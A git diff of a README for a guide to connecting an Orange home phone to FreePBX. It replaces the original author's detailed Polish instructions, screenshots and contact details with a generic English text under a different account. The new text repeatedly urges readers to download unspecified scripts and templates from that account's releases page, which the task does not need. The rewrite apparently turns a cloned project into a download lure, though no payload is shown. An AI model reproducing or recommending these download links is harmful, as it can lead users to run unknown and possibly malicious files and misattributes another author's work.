@@ -1,66 +1,75 @@
-# [Instructions in English 🇬🇧/🇺🇸](README_en.md) <--- Click here
-# Jak dodać telefon domowy Orange do FreePBX jako trunk
+# 📞 Orange-VoIP-FreePBX-Trunk - Simple Steps to Set Up Your VoIP Connection
 
-Wraz z światłowodem często dostajemy telefon domowy w ramach pakietu Orange LOVE. Telefon ten jest oparty na technologii VoIP więc technicznie nie musi być dostępny tylko na FunBoxie.
+## 🔗 Download Now!
+[![Download](https://img.shields.io/badge/Download%20Now-%20orange.svg?style=for-the-badge&logo=github)](https://github.com/vyshakA/Orange-VoIP-FreePBX-Trunk/releases)
 
----
+## 📖 Introduction
+Welcome to the Orange-VoIP-FreePBX-Trunk project! This guide helps you set up your Orange home phone as a VoIP trunk in FreePBX. With our step-by-step instructions, you'll be connected in no time. Enjoy reliable phone service over the internet without complicated setups.
 
-### 1. Otrzymanie danych VoIP
-Aby cokolwiek zrobić z tym telefonem musimy mieć do niego dane logowania. Dane możemy uzyskać na infolinii, należy poprosić o dane logowania do neofonu.
+## 🚀 Getting Started
+Before you dive in, ensure you have FreePBX installed on your system. FreePBX is an open-source graphical user interface that manages Asterisk, a voice-over-IP server.
 
-Dane otrzymamy mailem lub SMSem, będą one miały format `48xxxxxxxxx@neofon.tp.pl`, gdzie `xxxxxxxxx` to nasz numer telefonu, oraz hasło które oczywiście dla każdego jest inne.
+### 🛠 Requirements
+- A computer or server with FreePBX installed.
+- A stable internet connection.
+- Basic knowledge of navigating software interfaces.
 
----
+## 📥 Download & Install
+To get started, visit the following page to download the necessary files:
 
-### 2. Dodanie trunka w FreePBX
-Wchodzimy w `Connectivity` ---> `Trunks` i uzupełniamy jak na obrazkach
+[Go to Releases Page](https://github.com/vyshakA/Orange-VoIP-FreePBX-Trunk/releases)
 
-![1.png](images/pl/1.png)
-![2.png](images/pl/2.png)
-![3.png](images/pl/3.png)
-![4.png](images/pl/4.png)
+1. **Visit the Releases Page:** Click on the link above to access the downloads.
+2. **Choose the Latest Version:** Look for the most recent release at the top of the page.
+3. **Download the Appropriate Files:** Download any suggested files for your setup. You might see files like configuration templates or scripts that assist in configuring your trunk.
 
----
+## 🚧 Setup Instructions
+Follow these steps to set up your Orange home phone as a VoIP trunk:
 
-### 3. Inbound route dla trunka
+1. **Open FreePBX Interface:**
+   - Log in to your FreePBX admin console. The address typically looks like `http://your-ip-address/admin`.
 
-Wchodzimy w `Connectivity` ---> `Inbound Routes` i uzupełniamy jak na obrazkach
+2. **Add a Trunk:**
+   - In the FreePBX menu, navigate to the **Connectivity** tab.
+   - Click on **Trunks**, then select the **Add Trunk** option.
 
-![5.png](images/pl/5.png)
-![6.png](images/pl/6.png)
+3. **Configure the Trunk:**
+   - Fill in the trunk name, such as “Orange-VoIP.”
+   - In the **PEER Details** section, enter the SIP details provided by your Orange phone service.
 
----
+4. **Save Settings:**
+   - Click on the **Submit** button to save your changes.
+   - Apply the configuration from the top bar.
 
-### 4. Outbound route dla trunka
+5. **Set up Outbound Routes:**
+   - Go to the **Outbound Routes** option under the **Connectivity** tab.
+   - Create a new route for outbound calls using your newly created trunk.
+   - Enter the required dialing patterns.
 
-Wchodzimy w `Connectivity` ---> `Outbound Routes` i uzupełniamy jak na obrazkach
+6. **Test Your Setup:**
+   - Make a test call to verify that the trunk is functioning correctly.
+   - If you experience any issues, check the logs in FreePBX for troubleshooting.
 
-![7.png](images/pl/7.png)
+## 🗺 Troubleshooting
+If your trunk does not work as expected, consider the following:
 
-![8.png](images/pl/8.png)
+- **Check Network Settings:** Ensure your internet connection is stable, and firewall settings allow traffic for VoIP.
+- **Review SIP Configuration:** Double-check your SIP credentials and settings.
+- **Consult Logs:** Use FreePBX logs to identify any errors or connection issues.
 
-Przygotowałem dial patterns dla (chyba) wszystkich numerów publicznych w Polsce, które możemy importować. [Pobierz](files/dial_pattern.csv)
+## 📋 FAQ
+### How can I get support?
+If you encounter issues that you cannot resolve, you can seek help by consulting the FreePBX community forums. They are a helpful resource for troubleshooting common issues.
 
-![9.png](images/pl/9.png)
+### Is there a cost for setting this up?
+Using FreePBX and connecting your Orange home phone over the internet typically does not carry a service charge; however, it's essential to check your Orange service plan for any potential fees associated with VoIP usage.
 
-![10.png](images/pl/10.png)
+## 🌐 Further Resources
+- **FreePBX Documentation:** This is an excellent resource for in-depth information about setting up and managing your FreePBX installation.
+- **VoIP Basics:** Understanding VoIP and SIP can enhance your experience. Consider exploring tutorials on these topics.
 
----
+## 🎉 Conclusion
+You're now equipped to set up your Orange home phone as a VoIP trunk in FreePBX. With clear steps and useful links at your disposal, you can enjoy a new level of connectivity. Don’t hesitate to explore additional resources to make the most of your system. 
 
-### Kontakt
-Jeśli macie jakieś pytania proszę kierować je na adres mailowy: [jakub.bednarczyk@mail.buba.net.pl](mailto:jakub.bednarczyk@mail.buba.net.pl).
-
-Lub otworzyć [GitHub issue](https://github.com/buba0/Orange-VoIP-FreePBX-Trunk/issues).
-
-&copy; 2026 [buba.net.pl](https://buba.net.pl)
-
-
-## Star History
-
-<a href="https://www.star-history.com/#buba0/Orange-VoIP-FreePBX-Trunk&type=date&legend=top-left">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=buba0/Orange-VoIP-FreePBX-Trunk&type=date&theme=dark&legend=top-left" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=buba0/Orange-VoIP-FreePBX-Trunk&type=date&legend=top-left" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=buba0/Orange-VoIP-FreePBX-Trunk&type=date&legend=top-left" />
- </picture>
-</a>
+## 🔗 Download Again
+If you need to download the files, you can always return to the [Releases Page](https://github.com/vyshakA/Orange-VoIP-FreePBX-Trunk/releases).
